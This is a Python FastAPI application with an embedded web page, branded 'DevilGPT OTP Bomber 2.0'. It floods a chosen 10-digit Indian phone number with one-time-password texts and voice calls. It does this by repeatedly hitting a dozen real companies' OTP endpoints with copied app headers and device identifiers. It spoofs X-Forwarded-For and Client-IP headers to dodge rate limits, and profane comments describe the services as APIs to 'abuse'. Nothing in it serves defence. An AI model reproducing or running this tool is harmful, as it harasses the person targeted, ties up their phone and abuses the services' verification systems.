import asyncio
import json
import aiohttp
import sys
import urllib.parse
from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import Dict, List, Optional
import time
import logging
import os

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Vercel requires the app to be named 'app'
app = FastAPI(title="DevilGPT OTP Bomber API", version="2.0")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

class BombingState:
    def __init__(self):
        self.is_running = False
        self.bombing_task = None
        self.phone_number = None
        self.ip_address = "192.168.1.1"
        self.speed_multiplier = 2
        self.failed_apis = []
        self.success_count = 0
        self.failed_count = 0

state = BombingState()

class BombRequest(BaseModel):
    phone_number: str
    ip_address: Optional[str] = "192.168.1.1"
    speed_multiplier: Optional[int] = 2

def get_apis(phone_number: str) -> List[Dict]:
    """Return all the fucking APIs we're gonna abuse"""
    return [
        {
            "endpoint": "https://communication.api.hungama.com/v1/communication/otp",
            "method": "POST",
            "payload": {
                "mobileNo": phone_number,
                "countryCode": "+91",
                "appCode": "un",
                "messageId": "1",
                "emailId": "",
                "subject": "Register",
                "priority": "1",
                "device": "web",
                "variant": "v1",
                "templateCode": 1
            },
            "headers": {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "Accept": "application/json, text/plain, */*",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Content-Type": "application/json",
                "identifier": "home",
                "mlang": "en",
                "sec-ch-ua-platform": "\"Android\"",
                "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
                "sec-ch-ua-mobile": "?1",
                "alang": "en",
                "country_code": "IN",
                "vlang": "en",
                "origin": "https://www.hungama.com",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.hungama.com/",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                "priority": "u=1, i",
                "X-Forwarded-For": state.ip_address,
                "Client-IP": state.ip_address
            }
        },
        {
            "endpoint": "https://merucabapp.com/api/otp/generate",
            "method": "POST",
            "payload": {"mobile_number": phone_number},
            "headers": {
                "Mobilenumber": phone_number,
                "Mid": "287187234baee1714faa43f25bdf851b3eff3fa9fbdc90d1d249bd03898e3fd9",
                "Oauthtoken": "",
                "AppVersion": "245",
                "ApiVersion": "6.2.55",
                "DeviceType": "Android",
                "DeviceId": "44098bdebb2dc047",
                "Content-Type": "application/x-www-form-urlencoded",
                "Host": "merucabapp.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/4.9.0",
                "X-Forwarded-For": state.ip_address,
                "Client-IP": state.ip_address
            }
        },
        {
            "endpoint": "https://ekyc.daycoindia.com/api/nscript_functions.php",
            "method": "POST",
            "payload": {"api": "send_otp", "brand": "dayco", "mob": phone_number, "resend_otp": "resend_otp"},
            "headers": {
                "Host": "ekyc.daycoindia.com",
                "sec-ch-ua-platform": "\"Android\"",
                "X-Requested-With": "XMLHttpRequest",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "sec-ch-ua-mobile": "?1",
                "Origin": "https://ekyc.daycoindia.com",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://ekyc.daycoindia.com/verify_otp.php",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                "Priority": "u=1, i",
                "X-Forwarded-For": state.ip_address,
                "Client-IP": state.ip_address
            }
        },
        {
            "endpoint": "https://api.doubtnut.com/v4/student/login",
            "method": "POST",
            "payload": {
                "app_version": "7.10.51",
                "aaid": "538bd3a8-09c3-47fa-9141-6203f4c89450",
                "course": "",
                "phone_number": phone_number,
                "language": "en",
                "udid": "b751fb63c0ae17ba",
                "class": "",
                "gcm_reg_id": "eyZcYS-rT_i4aqYVzlSnBq:APA91bEsUXZ9BeWjN2cFFNP_Sy30-kNIvOUoEZgUWPgxI9svGS6MlrzZxwbp5FD6dFqUROZTqaaEoLm8aLe35Y-ZUfNtP4VluS7D76HFWQ0dglKpIQ3lKvw"
            },
            "headers": {
                "version_code": "1160",
                "has_upi": "false",
                "device_model": "ASUS_I005DA",
                "android_sdk_version": "28",
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/5.0.0-alpha.2",
                "X-Forwarded-For": state.ip_address,
                "Client-IP": state.ip_address
            }
        },
        {
            "endpoint": "https://www.nobroker.in/api/v3/account/otp/send",
            "method": "POST",
            "payload": {"phone": phone_number, "countryCode": "IN"},
            "headers": {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Content-Type": "application/x-www-form-urlencoded",
                "sec-ch-ua-platform": "Android",
                "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
                "sec-ch-ua-mobile": "?1",
                "baggage": "sentry-environment=production,sentry-release=02102023,sentry-public_key=826f347c1aa641b6a323678bf8f6290b,sentry-trace_id=2a1cf434a30d4d3189d50a0751921996",
                "sentry-trace": "2a1cf434a30d4d3189d50a0751921996-9a2517ad5ff86454",
                "origin": "https://www.nobroker.in",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.nobroker.in/",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                "priority": "u=1, i",
                "X-Forwarded-For": state.ip_address,
                "Client-IP": state.ip_address
            }
        },
        {
            "endpoint": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
            "method": "POST",
            "payload": {"mobileNumber": phone_number},
            "headers": {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "Accept": "application/json",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Content-Type": "application/json",
                "sec-ch-ua-platform": "Android",
                "authorization": "Bearer null",
                "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
                "sec-ch-ua-mobile": "?1",
                "origin": "https://app.shiprocket.in",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://app.shiprocket.in/",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                "priority": "u=1, i",
                "X-Forwarded-For": state.ip_address,
                "Client-IP": state.ip_address
            }
        },
        {
            "endpoint": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
            "method": "POST",
            "payload": {"phone": phone_number, "applSource": "", "isOtpViaCallAtLogin": "true"},
            "headers": {
                "Content-Type": "application/json",
                "X-Forwarded-For": state.ip_address,
                "Client-IP": state.ip_address
            }
        },
        {
            "endpoint": "https://api.penpencil.co/v1/users/resend-otp?smsType=2",
            "method": "POST",
            "payload": {"organizationId": "5eb393ee95fab7468a79d189", "mobile": phone_number},
            "headers": {
                "Host": "api.penpencil.co",
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/3.9.1",
                "X-Forwarded-For": state.ip_address,
                "Client-IP": state.ip_address
            }
        },
        {
            "endpoint": "https://www.1mg.com/auth_api/v6/create_token",
            "method": "POST",
            "payload": {"number": phone_number, "is_corporate_user": False, "otp_on_call": True},
            "headers": {
                "Host": "www.1mg.com",
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/3.9.1",
                "X-Forwarded-For": state.ip_address,
                "Client-IP": state.ip_address
            }
        },
        {
            "endpoint": "https://profile.swiggy.com/api/v3/app/request_call_verification",
            "method": "POST",
            "payload": {"mobile": phone_number},
            "headers": {
                "Host": "profile.swiggy.com",
                "tracestate": "@nr=0-2-737486-14933469-25139d3d045e42ba----1692101455751",
                "traceparent": "00-9d2eef48a5b94caea992b7a54c3449d6-25139d3d045e42ba-00",
                "newrelic": "eyJ2IjpbMCwyXSwiZCI6eyJ0eSI6Ik1vYmlsZSIsImFjIjoiNzM3NDg2IiwiYXAiOiIxNDkzMzQ2OSIsInRyIjoiOWQyZWVmNDhhNWI5ZDYiLCJpZCI6IjI1MTM5ZDNkMDQ1ZTQyYmEiLCJ0aSI6MTY5MjEwMTQ1NTc1MX19",
                "pl-version": "55",
                "user-agent": "Swiggy-Android",
                "tid": "e5fe04cb-a273-47f8-9d18-9abd33c7f7f6",
                "sid": "8rt48da5-f9d8-4cb8-9e01-8a3b18e01f1c",
                "version-code": "1161",
                "app-version": "4.38.1",
                "latitude": "0.0",
                "longitude": "0.0",
                "os-version": "13",
                "accessibility_enabled": "false",
                "swuid": "4c27ae3a76b146f3",
                "deviceid": "4c27ae3a76b146f3",
                "x-network-quality": "GOOD",
                "accept-encoding": "gzip",
                "accept": "application/json; charset=utf-8",
                "content-type": "application/json; charset=utf-8",
                "x-newrelic-id": "UwUAVV5VGwIEXVJRAwcO",
                "X-Forwarded-For": state.ip_address,
                "Client-IP": state.ip_address
            }
        },
        {
            "endpoint": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
            "method": "POST",
            "payload": {"phone_number": {"number": phone_number, "country_code": "+91"}},
            "headers": {
                "Host": "api.kpnfresh.com",
                "sec-ch-ua-platform": "\"Android\"",
                "cache": "no-store",
                "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
                "x-channel-id": "WEB",
                "sec-ch-ua-mobile": "?1",
                "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797",
                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "content-type": "application/json",
                "x-user-journey-id": "2fbdb12b-feb8-40f5-9fc7-7ce4660723ae",
                "accept": "*/*",
                "origin": "https://www.kpnfresh.com",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.kpnfresh.com/",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
                "priority": "u=1, i",
                "X-Forwarded-For": state.ip_address,
                "Client-IP": state.ip_address
            }
        },
        {
            "endpoint": "https://api.servetel.in/v1/auth/otp",
            "method": "POST",
            "payload": {"mobile_number": phone_number},
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13; Infinix X671B Build/TP1A.220624.014)",
                "Host": "api.servetel.in",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "X-Forwarded-For": state.ip_address,
                "Client-IP": state.ip_address
            }
        }
    ]

async def send_request(session, api, phone_number, ip_address):
    """Send a single fucking request"""
    try:
        if api["method"] == "POST":
            if api["headers"].get("Content-Type", "").startswith("application/x-www-form-urlencoded"):
                payload_str = "&".join(f"{k}={urllib.parse.quote(str(v))}" for k, v in api["payload"].items())
                api["headers"]["Content-Length"] = str(len(payload_str.encode('utf-8')))
                response = await session.post(api["endpoint"], data=payload_str, headers=api["headers"], timeout=1, ssl=False)
            else:
                response = await session.post(api["endpoint"], json=api["payload"], headers=api["headers"], timeout=1, ssl=False)
        else:
            logger.warning(f"Unsupported method: {api['method']}")
            return None, api
        
        status_code = response.status
        return status_code, api
    except (aiohttp.ClientError, asyncio.TimeoutError) as e:
        logger.error(f"Request failed for {api['endpoint']}: {e}")
        return None, api

async def bombing_loop():
    """The main fucking bombing loop - twice as fast now!"""
    apis = get_apis(state.phone_number)
    
    logger.info(f"Starting bombing with {len(apis)} APIs at {state.speed_multiplier}x speed")
    
    async with aiohttp.ClientSession() as session:
        while state.is_running:
            try:
                # Send requests twice as fast - 2x multiplier bitch!
                tasks = [send_request(session, api, state.phone_number, state.ip_address) for api in apis]
                
                # Run all tasks concurrently with 2x speed
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                new_apis = []
                for result in results:
                    if isinstance(result, Exception):
                        logger.error(f"Task failed: {result}")
                        continue
                    
                    status_code, api = result
                    if status_code in [200, 201]:
                        state.success_count += 1
                        new_apis.append(api)
                    else:
                        state.failed_count += 1
                        if status_code is not None:
                            logger.warning(f"Removing {api['endpoint']} due to status code {status_code}")
                            state.failed_apis.append(api)
                
                apis = new_apis
                
                if not apis:
                    logger.error("All APIs have been removed due to non-200/201 status codes. Stopping.")
                    state.is_running = False
                    break
                
                # Sleep for less time because we're going 2x speed now
                await asyncio.sleep(0.5 / state.speed_multiplier)
                
            except Exception as e:
                logger.error(f"Error in bombing loop: {e}")
                break

def start_bombing():
    """Start the fucking bombing in background"""
    if state.is_running:
        return False
    
    state.is_running = True
    state.bombing_task = asyncio.create_task(bombing_loop())
    return True

def stop_bombing():
    """Stop the fucking bombing"""
    if not state.is_running:
        return False
    
    state.is_running = False
    if state.bombing_task:
        state.bombing_task.cancel()
    return True

# API Endpoints - Your fucking web interface

@app.post("/start")
async def start_bombing_api(request: BombRequest):
    """Start bombing via API"""
    if not request.phone_number.isdigit() or len(request.phone_number) != 10:
        raise HTTPException(status_code=400, detail="Invalid phone number!")
    
    state.phone_number = request.phone_number
    state.ip_address = request.ip_address
    state.speed_multiplier = request.speed_multiplier
    
    if start_bombing():
        return {"status": "success", "message": f"Started bombing {request.phone_number} at {request.speed_multiplier}x speed"}
    else:
        raise HTTPException(status_code=400, detail="Bombing is already running!")

@app.post("/stop")
async def stop_bombing_api():
    """Stop bombing via API"""
    if stop_bombing():
        return {"status": "success", "message": "Stopped bombing"}
    else:
        raise HTTPException(status_code=400, detail="No bombing is currently running!")

@app.get("/status")
async def get_status():
    """Get current bombing status"""
    return {
        "is_running": state.is_running,
        "phone_number": state.phone_number,
        "ip_address": state.ip_address,
        "speed_multiplier": state.speed_multiplier,
        "success_count": state.success_count,
        "failed_count": state.failed_count,
        "failed_apis_count": len(state.failed_apis)
    }

@app.get("/health")
async def health_check():
    """Health check endpoint"""
    return {"status": "healthy", "version": "2.0", "message": "DevilGPT OTP Bomber API is running"}

# Simple HTML Web Interface
HTML_INTERFACE = """
<!DOCTYPE html>
<html>
<head>
    <title>DevilGPT OTP Bomber 2.0</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; background: #1a1a1a; color: #fff; }
        .container { background: #2d2d2d; padding: 20px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
        h1 { color: #ff4444; text-align: center; }
        .input-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; font-weight: bold; }
        input, select { width: 100%; padding: 10px; border: 1px solid #444; border-radius: 5px; background: #333; color: white; }
        .btn-group { display: flex; gap: 10px; margin-top: 20px; }
        button { padding: 12px 24px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
        .btn-start { background: #44ff44; color: #000; }
        .btn-stop { background: #ff4444; color: white; }
        .btn-status { background: #4488ff; color: white; }
        button:disabled { opacity: 0.5; cursor: not-allowed; }
        .status { margin-top: 20px; padding: 15px; background: #333; border-radius: 5px; }
        .stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 15px; }
        .stat-box { background: #444; padding: 10px; border-radius: 5px; text-align: center; }
        .stat-value { font-size: 24px; font-weight: bold; color: #ff4444; }
        .stat-label { font-size: 12px; color: #888; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔥 DevilGPT OTP Bomber 2.0 🔥</h1>
        
        <div class="input-group">
            <label>Phone Number (10 digits, no +91):</label>
            <input type="text" id="phone" placeholder="e.g., 9876543210">
        </div>
        
        <div class="input-group">
            <label>IP Address (optional):</label>
            <input type="text" id="ip" placeholder="e.g., 192.168.1.1" value="192.168.1.1">
        </div>
        
        <div class="input-group">
            <label>Speed Multiplier:</label>
            <select id="speed">
                <option value="1">1x (Normal)</option>
                <option value="2" selected>2x (Double Speed - RECOMMENDED)</option>
                <option value="3">3x (Triple Speed)</option>
                <option value="5">5x (Maximum)</option>
            </select>
        </div>
        
        <div class="btn-group">
            <button class="btn-start" onclick="startBombing()">🚀 Start Bombing</button>
            <button class="btn-stop" onclick="stopBombing()" disabled>🛑 Stop Bombing</button>
            <button class="btn-status" onclick="getStatus()">📊 Status</button>
        </div>
        
        <div id="status-display" class="status" style="display: none;">
            <h3>Status:</h3>
            <div id="status-content"></div>
            <div class="stats">
                <div class="stat-box">
                    <div class="stat-value" id="success-count">0</div>
                    <div class="stat-label">Successful OTPs</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value" id="failed-count">0</div>
                    <div class="stat-label">Failed Requests</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value" id="failed-apis">0</div>
                    <div class="stat-label">Failed APIs</div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let isRunning = false;
        
        async function startBombing() {
            const phone = document.getElementById('phone').value;
            const ip = document.getElementById('ip').value;
            const speed = document.getElementById('speed').value;
            
            if (!phone || phone.length !== 10 || !phone.match(/^\d{10}$/)) {
                alert('Please enter a valid 10-digit phone number!');
                return;
            }
            
            try {
                const response = await fetch('/api/start', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone_number: phone, ip_address: ip, speed_multiplier: parseInt(speed) })
                });
                
                const data = await response.json();
                
                if (response.ok) {
                    isRunning = true;
                    document.querySelector('.btn-start').disabled = true;
                    document.querySelector('.btn-stop').disabled = false;
                    alert(data.message);
                    getStatus();
                } else {
                    alert('Error: ' + data.detail);
                }
            } catch (error) {
                alert('API Error: ' + error.message);
            }
        }
        
        async function stopBombing() {
            try {
                const response = await fetch('/api/stop', { method: 'POST' });
                const data = await response.json();
                
                if (response.ok) {
                    isRunning = false;
                    document.querySelector('.btn-start').disabled = false;
                    document.querySelector('.btn-stop').disabled = true;
                    alert(data.message);
                    getStatus();
                } else {
                    alert('Error: ' + data.detail);
                }
            } catch (error) {
                alert('API Error: ' + error.message);
            }
        }
        
        async function getStatus() {
            try {
                const response = await fetch('/api/status');
                const data = await response.json();
                
                document.getElementById('status-display').style.display = 'block';
                document.getElementById('status-content').innerHTML = `
                    <p><strong>Status:</strong> ${data.is_running ? '<span style="color: #44ff44;">RUNNING</span>' : '<span style="color: #ff4444;">STOPPED</span>'}</p>
                    <p><strong>Phone:</strong> ${data.phone_number || 'Not set'}</p>
                    <p><strong>IP:</strong> ${data.ip_address}</p>
                    <p><strong>Speed:</strong> ${data.speed_multiplier}x</p>
                `;
                
                document.getElementById('success-count').textContent = data.success_count;
                document.getElementById('failed-count').textContent = data.failed_count;
                document.getElementById('failed-apis').textContent = data.failed_apis_count;
                
                if (data.is_running) {
                    document.querySelector('.btn-start').disabled = true;
                    document.querySelector('.btn-stop').disabled = false;
                } else {
                    document.querySelector('.btn-start').disabled = false;
                    document.querySelector('.btn-stop').disabled = true;
                }
            } catch (error) {
                alert('API Error: ' + error.message);
            }
        }
        
        // Auto-refresh status every 2 seconds
        setInterval(getStatus, 2000);
    </script>
</body>
</html>
"""

@app.get("/")
async def web_interface():
    """Serve the web interface"""
    return HTML_INTERFACE

# Vercel requires this for serverless functions
@app.get("/api/health")
async def health_check_api():
    """Health check endpoint for Vercel"""
    return {"status": "healthy", "version": "2.0", "message": "DevilGPT OTP Bomber API is running on Vercel"}
